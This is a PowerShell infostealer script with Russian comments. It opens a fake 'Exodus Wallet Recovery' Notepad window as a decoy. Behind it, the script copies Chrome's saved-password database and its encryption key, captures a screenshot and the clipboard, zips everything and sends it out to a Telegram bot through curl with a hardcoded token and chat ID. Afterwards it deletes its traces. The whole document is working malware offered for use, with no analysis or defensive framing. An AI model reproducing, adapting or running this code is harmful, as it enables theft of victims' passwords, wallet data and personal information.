# 1. Принудительно включаем поддержку TLS 1.2 для работы с API Telegram
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- ТВОИ ДАННЫЕ ---
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# 2. СОЗДАЕМ ФЕЙКОВЫЙ ТЕКСТ ДЛЯ БЛОКНОТА (Легенда)
$fakeContent = @"
EXODUS WALLET RECOVERY SYSTEM
------------------------------
Status: Synchronizing with blockchain...
Error: 0x8004210B (Connection Timeout)
Action Required: Please keep this window open for 2-3 minutes.
The system is attempting to decrypt the backup seed phrase.

Current Node: 185.241.104.11
Status: Waiting for handshake...
"@

$fakeFile = "$env:TEMP\recovery_log.txt"
$fakeContent | Out-File $fakeFile -Encoding utf8

# Сразу запускаем Блокнот с этим текстом
Start-Process notepad.exe -ArgumentList $fakeFile

# 3. ОСНОВНОЙ СКРИПТ СБОРА ДАННЫЕ
$workDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    # Копируем ключи шифрования и базу паролей (даже если браузер открыт)
    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
    if (Test-Path $loginData) {
        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $out = [System.IO.File]::Create("$workDir\passwords.db")
        $stream.CopyTo($out); $stream.Close(); $out.Close()
    }

    # Делаем скриншот экрана
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $bmp.Save("$workDir\screen.png")
    $g.Dispose(); $bmp.Dispose()

    # Забираем буфер обмена
    "Clipboard Content: $((Get-Clipboard) -join ' ')" | Out-File "$workDir\info.txt"

    # Упаковываем всё в один ZIP
    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)

    # Отправляем файл в Telegram через встроенный curl
    & curl.exe -s -F "chat_id=$chatId" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"

} catch {
    # В случае ошибки отправляем уведомление (тихо для пользователя)
    $err = $_.Exception.Message
    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
} finally {
    # Зачищаем следы
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}
